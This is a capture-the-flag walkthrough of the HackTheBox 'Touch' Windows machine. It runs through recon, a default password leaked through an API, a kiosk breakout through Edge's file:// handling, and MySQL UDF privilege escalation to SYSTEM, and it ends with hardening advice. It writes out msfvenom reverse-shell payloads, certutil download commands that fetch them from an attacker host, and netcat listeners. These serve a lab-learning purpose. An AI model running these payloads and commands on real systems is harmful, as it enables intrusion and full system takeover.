# HackTheBox — Touch: Full Walkthrough

> **Target:** 10.129.46.4
> **OS:** Windows
> **Difficulty:** Easy

**Spoiler warning:** This walkthrough contains the full attack chain, including flags (redacted). It is intended for learning purposes after you've attempted the box yourself.

---

## Table of Contents

1. [Recon](#1-recon)
2. [Web Enumeration — DeviceHub](#2-web-enumeration--devicehub)
3. [Booking Code from Layover](#3-booking-code-from-layover)
4. [DeviceHub Login Bypass via Serial Number](#4-devicehub-login-bypass-via-serial-number)
5. [Credential Discovery](#5-credential-discovery)
6. [Initial Access — RDP into the Kiosk](#6-initial-access--rdp-into-the-kiosk)
7. [Kiosk Breakout](#7-kiosk-breakout)
8. [Stabilizing the Shell](#8-stabilizing-the-shell)
9. [User Flag](#9-user-flag)
10. [Privilege Enumeration](#10-privilege-enumeration)
11. [Hunting MySQL Credentials](#11-hunting-mysql-credentials)
12. [Privilege Escalation — MySQL UDF](#12-privilege-escalation--mysql-udf-abuse)
13. [Root Flag](#13-root-flag)
14. [Mitigations & Hardening Notes](#14-mitigations--hardening-notes)

---

## TL;DR — Attack Chain

```javascript
Booking code (from Layover) ──► DeviceHub API leaks device serial
        │                              │
        ▼                              ▼
   Check-in web app            DeviceHub admin login
        │                        (serial = default password)
        │                              │
        │                              ▼
        │                        Staff creds exposed (KioskUser)
        │                              │
        │                              ▼
        │                        RDP → locked-down kiosk
        │                              │
        │                              ▼
        │               Kill DocReader service → error dialog
        │                       → Edge → file:/// cmd.exe
        │                              │
        │                              ▼
        │                   Reverse shell as KioskUser [USER]
        │                              │
        │                              ▼
        │              Plaintext MySQL root creds in ProgramData
        │                              │
        │                              ▼
        │              UDF DLL → MySQL (LocalSystem) = SYSTEM [ROOT]
```

---

## 1. Recon

Initial Nmap scan:

```bash
sudo nmap -sC -sV -Pn 10.129.46.4 -oN nmap_initial.txt
```

```javascript
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Full port sweep to be thorough:

```bash
sudo nmap -p- --min-rate 10000 -Pn 10.129.46.4 -oN nmap_allports.txt
```

Reading the results:

- **3389** — RDP is open. There will almost certainly be a user to log in as at some point.
- **5985** — WinRM available, handy later for a nicer shell if we get creds.
- **8443** — A web app. The HTTPAPI banner means IIS/Windows-hosted. Port 8443 *suggests* HTTPS, but as we'll see, assumptions are dangerous.

---

## 2. Web Enumeration — DeviceHub

### The HTTPS trap

Hitting `https://10.129.46.4:8443/` fails:

```javascript
SSL_ERROR_RX_RECORD_TOO_LONG
```

This error means the server responded with **plain HTTP bytes** to a TLS handshake — i.e., the port serves **HTTP, not HTTPS**. Port numbers are conventions, not contracts. Retry over plain HTTP:

```javascript
http://10.129.46.4:8443/
```

The page loads a **Nexion DeviceHub** login panel for a device labeled *"DH-100 — Gate B7"*.

### Directory enumeration

```bash
feroxbuster -u http://10.129.46.4:8443/ -k
```

```javascript
403   GET        5l       29w      312c http://10.129.46.4:8443/api
200   GET       14l       42w      398c http://10.129.46.4:8443/api/status
405   GET        5l       29w      313c http://10.129.46.4:8443/api/scan
```

- `/api` — 403, the endpoint root exists but is protected.
- `/api/status` — **200, unauthenticated.** Interesting.
- `/api/scan` — 405 on GET, so it wants a different verb (POST).

```bash
curl http://10.129.46.4:8443/api/status
```

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":67184}
```

We now have the **device serial number** without any authentication. Keep that in your pocket — it smells like a credential.

---

## 3. Booking Code from Layover

This box is part of a travel-themed chain. The previous machine (**Layover**) yielded a passenger name and booking confirmation code:

```javascript
Jenny Crawford / KS7X2M
```

The machine description for Touch hinted it would be useful here. The check-in web app is the obvious place to try it.

---

## 4. DeviceHub Login Bypass via Serial Number

The DeviceHub `/login` page contains a helpful hint in its HTML:

> *"The default password is the device serial number included in your DeviceHub packaging."*

We never saw the packaging — but we already pulled the serial from the unauthenticated `/api/status` endpoint.

```javascript
Password: NX-DH-2024-B7042
```

Logged in. **Lesson #1 of this box:** never derive default/fallback passwords from predictable, enumerable device data. Serial numbers are not secrets.

---

## 5. Credential Discovery

Inside the authenticated DeviceHub panel, device and service information is exposed:

```javascript
Nexion Systems Ltd.  — Service v4.2.1
Nexion DocReader SR-4200 — 4.2.1
NX-TP-2024-0042 — 2.8.3
```

More importantly, alongside the device info, **staff credentials** are sitting in the panel:

```javascript
KioskUser : K!0sk2026#
```

**Lesson #2:** an admin panel that also stores staff logins is a single point of compromise for both management plane and user access.

---

## 6. Initial Access — RDP into the Kiosk

```bash
xfreerdp3 /u:KioskUser /p:'K!0sk2026#' /v:10.129.46.4 +clipboard /dynamic-resolution
```

The session opens into a locked-down **kiosk environment**: no desktop, no taskbar, no Start menu. A launcher script (`KioskLauncher.bat`) cycles full-screen between two apps:

- the HTB Airways **self-check-in** web app
- the Nexion **DocReader** scanner app

Quick reality checks:

- **Clipboard doesn't work.** `+clipboard` negotiates fine client-side, but the server silently drops it — standard kiosk hardening via RDP/TSE policy. Don't burn time fighting it; plan around it from the start.
- Typing long commands into a nested RDP window is painful. Everything from here aims at getting a proper reverse shell quickly.

---

## 7. Kiosk Breakout

The kiosk lockdown constrains the *launcher*, not the *session*. The escape leverages the kiosk's own error handling:

1. **Denial as a feature.** From the **attacker's own browser**, log back into the DeviceHub admin panel (`http://10.129.46.4:8443`) and **power OFF the DocReader and Printer services**. The kiosk never validates that its backends are alive — it just breaks.
2. **Weaponize the error path.** In the RDP kiosk session, click **"Staff Login"**. The app tries to talk to the (now dead) DocReader service, fails, and shows an **error dialog containing a support hyperlink**.
3. **Browser as a beachhead.** Clicking the support link opens **Microsoft Edge** — the first unrestricted program reachable from inside the kiosk shell.
4. **`file://` as an execution primitive.** In the Edge address bar:

```javascript
   file:///C:/Windows/System32/cmd.exe
```

Edge treats this as a file **download** rather than navigation. From the download prompt, click **Open** — `cmd.exe` spawns as `KioskUser`, completely outside the kiosk launcher.

**Why this works:** Edge was permitted to download and open files without elevation, and `file://` navigation turned the browser's download handler into an arbitrary program execution mechanism. Every kiosk protection collapsed the moment an unrestricted browser was reachable.

**Lesson #3:** kiosk hardening must include blocking `file://` navigation, restricting the download/open action, and never running the shell and the browser under the same trust boundary.

---

## 8. Stabilizing the Shell

Since clipboard is dead and the RDP-nested console is fragile, deploy a proper reverse shell immediately.

Attacker:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.38 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 80
nc -lvnp 4444
```

Target (in the escaped `cmd.exe`):

```powershell
certutil -urlcache -split -f http://10.10.14.38/shell.exe C:\Users\KioskUser\Desktop\shell.exe
C:\Users\KioskUser\Desktop\shell.exe
```

Certutil is a clean built-in download cradle — no PowerShell restrictions to fight, no clipboard needed.

---

## 9. User Flag

```powershell
C:\Users\KioskUser\Desktop> type user.txt
HTB{<redacted>}
```

---

## 10. Privilege Enumeration

```powershell
whoami /groups
```

Notable membership:

```javascript
KIOSK-042\Printer Administrators
```

A custom group — worth noting, but let's check the classic paths first.

```powershell
whoami /priv
```

No exploitable privileges — no `SeLoadDriverPrivilege`, no `SeImpersonatePrivilege`, etc. Token/driver-based privesc is off the table.

### Local services

```powershell
netstat -ano | findstr LISTENING
```

Two local-only services stand out:

```javascript
TCP 127.0.0.1:3001   — Node/web app (the kiosk self-check-in frontend, confirmed via curl)
TCP 127.0.0.1:3306   — MySQL
```

A database running locally, reachable only from the box itself — we just need to find its credentials.

### Writable MySQL install

```powershell
icacls "C:\MySQL\bin"
```

```javascript
NT AUTHORITY\Authenticated Users:(I)(M)
```

`Authenticated Users` has **Modify** rights on the MySQL install directory — but the `MySQL80` service runs as `LocalSystem` and the current user cannot stop/start it (`Access Denied`). A simple binary-swap-and-restart won't work; we need a way to make MySQL load our code *while it's running*.

---

## 11. Hunting MySQL Credentials

First instinct — application directories:

```javascript
C:\Program Files\HTB Airways
C:\Program Files\Nexion Systems\DocReader
```

Searched for hardcoded creds, `.env` files, and decompiled the .NET binaries (`HTBAirwaysKiosk.exe`, `NexionDocReader.exe`). **Nothing.** Don't tunnel-vision on Program Files.

Next stop — **`C:\ProgramData`** (world-readable by design, and a classic credential graveyard):

```javascript
C:\ProgramData\HTB Airways\
├── db-config.ini          (Access Denied)
├── db-sync-replica.ps1    (Access Denied)
├── refresh-dates.bat      <-- readable
└── refresh-dates.sql
```

`refresh-dates.bat` is a scheduled maintenance script with a hardcoded MySQL root password:

```bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

```javascript
root : HTB@irw4ys_DB!2026
```

**Lesson #4:** never embed plaintext credentials in scheduled-task scripts — especially in world-readable paths like `C:\ProgramData`.

---

## 12. Privilege Escalation — MySQL UDF Abuse

We now have everything the technique needs:

| Ingredient | Status |
| --- | --- |
| MySQL 8.0 running as `LocalSystem` | ✅ |
| Root credentials | ✅ `HTB@irw4ys_DB!2026` |
| Writable plugin directory | ✅ `C:\MySQL\lib\plugin\` |

(MySQL 8 no longer ships the classic `sys_exec`/`lib_mysqludf_sys` helpers in default builds — a custom DLL is required, which is what makes the writable plugin directory fatal.)

### Confirm the plugin directory

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SHOW VARIABLES LIKE 'plugin_dir';"
# plugin_dir => C:\MySQL\lib\plugin\
```

```powershell
icacls "C:\MySQL\lib\plugin"
# NT AUTHORITY\Authenticated Users:(I)(M)
```

### Build and deliver the UDF payload

Attacker — note the **different port** from the user shell, and the `dll` format:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.38 LPORT=5555 -f dll -o evil.dll
```

Target:

```powershell
certutil -urlcache -split -f http://10.10.14.38/evil.dll C:\MySQL\lib\plugin\evil.dll
```

### Trigger

Start the second listener first:

```bash
nc -lvnp 5555
```

Then register the function — the payload DLL executes **on load**, inside the `MySQL80` process, no separate function call needed:

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"
```

```javascript
NT AUTHORITY\SYSTEM
```

**Lesson #5:** a MySQL plugin directory writable by non-administrative accounts is a direct, documented path to SYSTEM. Lock down both the install and plugin directories to the service account and admins only.

---

## 13. Root Flag

```powershell
C:\Users\Administrator\Desktop> whoami
nt authority\system
C:\Users\Administrator\Desktop> type root.txt
HTB{<redacted>}
```

---

## 14. Mitigations & Hardening Notes

| Finding | Fix |
| --- | --- |
| Default DeviceHub password derived from device serial, leaked by unauthenticated `/api/status` | Never derive credentials from enumerable device data; require unique per-device passwords set at provisioning |
| Staff credentials stored in the DeviceHub admin panel | Separate management-plane and user-plane credential stores; vault service accounts |
| Kiosk escape via dead backend → error dialog → browser → `file://` | Block `file://` navigation by policy; disable download-and-open; run kiosk shell and browser under separate, least-privilege accounts |
| Clipboard restrictions bypassed entirely by external browser admin + payload download | Treat "physical" session restrictions as convenience, not security — the attacker machine is part of your attack surface |
| Plaintext MySQL root password in world-readable `C:\ProgramData` maintenance script | Use the Windows service account / gMSA or DPAPI-protected secrets for scheduled tasks |
| `C:\MySQL` (incl. `lib\plugin`) writable by `Authenticated Users` | Restrict ACLs to the service account and local admins — kills the UDF privesc path |
| MySQL running as `LocalSystem` | Run as a dedicated least-privilege service account |

---

*Walkthrough by [your handle]. Feedback and corrections welcome via issues/PRs.*
